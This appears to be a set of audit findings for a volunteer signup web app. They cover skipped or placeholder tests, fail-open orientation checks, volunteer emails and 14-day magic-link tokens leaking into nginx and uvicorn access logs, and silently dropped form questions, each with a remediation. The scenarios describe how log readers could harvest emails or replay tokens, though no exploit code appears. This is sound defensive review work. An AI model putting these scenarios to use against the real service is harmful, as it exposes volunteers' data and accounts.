findings.attack_scenario: playwright.config.js:5 sets `testDir: './e2e'`, so this file is not even collected — it is doubly dead (wrong directory AND describe.skip), and its single assertion is expect(true).toBe(true). The flows it names have no other e2e coverage: waitlist promotion after a cancellation (the path that decides whether a volunteer is told they got a seat), admin broadcast delivery, and the organizer QR check-in fallback are all absent from e2e/. So three user-visible flows ship with zero end-to-end verification, while the repo contains a file whose name and section comments read as if they were covered — which is worse than an acknowledged gap, because it answers the question 'is this tested?' with a false yes.
findings.remediation: Either delete the file, or move it into ./e2e, drop the .skip, and replace the placeholder with the real assertions — the section comments already describe them. Deleting is a legitimate choice; leaving a skipped placeholder that claims coverage is not. If the flows are genuinely untested, that belongs in the backlog as an explicit gap rather than as a dead spec file.

findings.title: A frontend test pins the orientation gate failing OPEN when the credit check errors
findings.attack_scenario: The passing state of this test is 'when the orientation credit check errors, submit the signup anyway'. It is survivable today only because the server re-checks and returns ORIENTATION_REQUIRED (asserted by the very next test). But it pins fail-open as INTENDED client behaviour, so nobody may tighten it without a red build, and it exercises no negative branch. Had the server-side check been the thing that regressed, the client would place un-oriented volunteers into K-12 classrooms and both tests would still be green. The pair together assert that the client trusts the server, and never assert that the server actually rejects — the server-side ORIENTATION_REQUIRED path is itself mocked, so no test in the frontend suite exercises a real rejection. Rated Low because the server check does currently exist and does work; the finding is that the test suite would not tell you if it stopped.
findings.remediation: Either flip the client to fail closed (block submission and surface 'we couldn't verify your orientation') and assert THAT, or keep the fail-open behaviour as a deliberate product choice and rename the test to say so explicitly, then add a backend test that pins the server-side ORIENTATION_REQUIRED rejection unmocked. The current pairing documents a trust relationship without testing either end of it.

findings.title: The coverage-gate tripwire and the eval-script smoke tests skip unconditionally under the project's own documented test command
findings.attack_scenario: _discover_paths() probes backend_dir.parent/.github/workflows/ci.yml, /repo/... and /workspace/.... The documented run command in CLAUDE.md mounts only `$PWD/backend:/app`, so backend_dir.parent is `/` and none of the three exist — this module-scoped skip therefore disables every assertion in the file on every developer run. The file's own docstring calls itself a tripwire that 'fails loudly in CI instead of allowing the gate to degrade unnoticed', but it is inert exactly where a developer would first see it, which is the moment the feedback is worth most. Same shape in test_eval_script_smoke.py:78, 90, 101, 123, whose _CANDIDATE_REPO_ROOTS has the identical problem, so the frozen 30-question eval testset and scripts/eval_rerank_lift.py are unverified outside a bespoke host run.
findings.remediation: Vendor .github/workflows/ci.yml into the image, or mount the repo root in the documented command, and then make absence fatal rather than skippable — a tripwire that can silently not run is not a tripwire. Update the docker command in CLAUDE.md in the same change so the documented path is the covered one.

findings.title: Volunteer email addresses are sent as URL query parameters on public endpoints, landing in access logs — contradicting the module's own stated no-log policy
findings.attack_scenario: VERIFIED by orchestrator against source, including the comment three lines above the helper. (1) A volunteer picks a shift on the public event page and enters their email. (2) On submit, the page calls api.public.orientationCheck(identity.email, eventId) (EventDetailPage.jsx:1208-1211). (3) publicOrientationCheck puts the address in `params` (api.js:488-494); buildQuery serialises it and request builds `${API_BASE}${path}${buildQuery(params)}` (api.js:86). The wire request is GET /api/v1/public/orientation-check?email=<address>&event_id=<uuid>. publicOrientationStatus (api.js:482-484) does the same. (4) Production runs uvicorn with no --no-access-log (docker-compose.prod.yml:80), so the default access logger writes the full request line — query string included — to container stdout for every call. (5) Every volunteer email that reaches the orientation gate is therefore persisted in plaintext in the backend log, which is precisely what the comment at api.js:464 forbids. Anyone with `docker logs` or log-shipping access — a wider group than those authorised to read the volunteer table — harvests the roster of UCSB student emails. Rated Medium rather than High: exposure is to log readers rather than the open internet, and the leaked datum is an email address, not a credential. The comment's presence is what makes this a genuine defect rather than an accepted trade-off — the intent was explicit and the implementation contradicts it.
findings.remediation: Change both helpers to POST with the address in the body, mirroring the already-correct checkInLookup shape at api.js:723-728. BREAKING: the matching backend routes must change from GET to POST and ship in the SAME deploy, or the orientation gate silently fails open — the call site's bare `catch {}` (EventDetailPage.jsx:1223-1227) swallows the error and proceeds to submit. If a coordinated deploy is not possible before launch, the interim mitigation is `--no-access-log` on docker-compose.prod.yml:80, accepting the loss of request logging.

findings.title: Magic-link manage token travels in the query string of both the SPA URL and every API call, landing in nginx and uvicorn logs and in browser history for its full 14-day life
findings.attack_scenario: VERIFIED by orchestrator. (1) A volunteer opens the emailed link https://<host>/signup/confirm?token=<T>. The route is public (App.jsx:101) and the page reads the token off the query string (ConfirmSignupPage.jsx:41). (2) That first navigation is a plain GET for the SPA shell served by nginx; frontend/nginx.conf never sets `access_log off`, so nginx logs `GET /signup/confirm?token=<T>` to stdout. (3) The page then calls confirmSignup(token), sending POST /api/v1/public/signups/confirm?token=<T> (api.js:495-497) — uvicorn logs the request line with the query string, so the token is in the backend log too. (4) On success the page renders <ManageSignupsPage tokenOverride={token} />, which issues GET /public/signups/manage?token=<T> and passes the same token to <ReminderPreferencesCard manageToken={token} />, whose toggle performs a WRITE: PUT /public/preferences?manage_token=<T> (api.js:510-517). One token in the logs therefore grants both read of the volunteer's name and full schedule AND write to their reminder settings. (5) The window is long — the page's own copy states magic links are good for 14 days, citing SIGNUP_CONFIRM_TTL (ConfirmSignupPage.jsx:88-91). Anyone who can read container logs, or who picks up a shared or synced browser history on the volunteer's device, replays the token for two weeks. Rated Medium: a bearer credential in a low-sensitivity scope (one volunteer's schedule), exposed to log readers and local history rather than to a remote attacker. Note the orchestrator confirmed Referer leakage is NOT a path here — the token pages make no cross-site navigations and the two external links both pass noreferrer.
findings.remediation:
Two changes. (a) Keep the token out of the API query string: move it to a header (request already supports `headers`, api.js:83-94) and carry manage_token in the existing PUT body rather than in params. (b) Keep it out of the frontend access log by having emails point at #token=<T> and reading window.location.hash — browsers never send the fragment to the server. Also add <meta name="referrer" content="strict-origin"> to frontend/index.html, which currently declares no referrer policy. BREAKING: links already in inboxes carry ?token= and stay valid 14 days, so both pages must keep accepting the query-string form (immediately history.replaceState-ing it out of the URL) for at least one full TTL after the change, or every outstanding confirmation email breaks.

--- ACCEPTED RISK 2026-08-12 — same decision and same reasoning as BASE-SEC-32; this is that finding's log/history surface rather than a separate choice. Partly reduced by BASE-SEC-39's masking work in the same pass (the application log no longer pairs these URLs with a plaintext address), but the token itself still travels in the query string and lands in access logs and browser history for its 14-day life. Revisit alongside BASE-SEC-32.

findings.title: Custom signup questions are silently dropped when the form-schema request fails — the volunteer submits an incomplete signup and neither side is told
findings.attack_scenario: VERIFIED by orchestrator: `grep -n formSchemaQ EventDetailPage.jsx` returns EXACTLY two lines, 834 and 839 — so isError and isPending are never read anywhere in the 1733-line file. (1) formSchemaQ is the only source of the event's custom questions, and line 839 collapses every non-success state to an empty array. (2) A volunteer loads /volunteer/events/:eventId. The event query succeeds; the form-schema request fails — a 429 from the public rate limiter, a dropped connection on campus wifi, a transient 5xx. The global react-query config retries once and gives up (main.jsx:14). (3) The page renders normally. Because formSchema.length is 0, the entire 'A few more questions' block is skipped (lines 1654-1661) — the volunteer never learns questions existed. (4) validateIdentity iterates the same empty array (lines 933-944), so no required-field error fires, and buildResponsesArray returns []. (5) The signup posts with responses: [] and SUCCEEDS — the comment at lines 930-932 confirms the server accepts missing answers as an organizer override. The volunteer lands on the success card believing they are fully signed up. (6) Impact for this app specifically: these are the fields organizers use for transport and accessibility needs on a van trip to a school. The organizer sees a roster row with blank answers and no signal the volunteer was never asked; the volunteer has no idea they skipped anything. Medium because the failure is silent on BOTH sides with no recovery path short of the organizer chasing the volunteer.
findings.remediation: Treat a failed schema fetch as blocking rather than as an empty schema. After the existing eventQ.isError branch (line 1272) add a formSchemaQ.isError branch rendering ErrorState with a retry action, and fold isPending into the existing submit gate: `disabled={isSubmitting || outsideWindow || formSchemaQ.isPending}`. No breaking change — ErrorState and Button are already imported. The general lesson applies beyond this file: `?.data?.x || []` silently converts a failed request into a successful empty result, and is worth grepping for elsewhere.

findings.title: Every confirm-link failure, including a dropped network request, tells the volunteer their link expired and to re-submit their signup
findings.attack_scenario: VERIFIED at ConfirmSignupPage.jsx:66. (1) A volunteer opens their confirmation link on a phone with patchy campus wifi. confirmSignup(token) rejects — a TypeError from fetch (api.js has no timeout, recorded separately as BASE-CONFIG-28), a 429 from the public rate limiter, or a 5xx. (2) The single `.catch(() => setState("error"))` discards the error entirely — status, code and message all thrown away, even though `request` attaches err.status and err.code for exactly this purpose (api.js:143-147). (3) The error branch unconditionally renders 'This link has expired ... re-submit your signup to get a new one', with no retry action — the only button navigates away to /volunteer. The page's own comment at lines 84-87 acknowledges the collapse and justifies it as the most common case. (4) The volunteer follows the instruction, returns to the event and signs up again. Their original signup is still pending and still holds a seat, so the second attempt hits the duplicate path and they get 'You've already signed up for this session with that email' — a dead end, with the still-unconfirmed original silently expiring later. (5) Low rather than Medium because a page reload retries the confirm and usually recovers; the cost is a confused volunteer and, worst case, a released seat. Included because the remedy is three lines and the copy actively misdirects.
findings.remediation: Branch on the error: capture err?.status in state, and show the expired copy only for a 4xx that is not 429 — otherwise render the network-error copy already used in this flow (ManageSignupsPage.jsx:155-167) with a retry that re-runs the effect. No breaking change; ErrorState and Button are already imported.
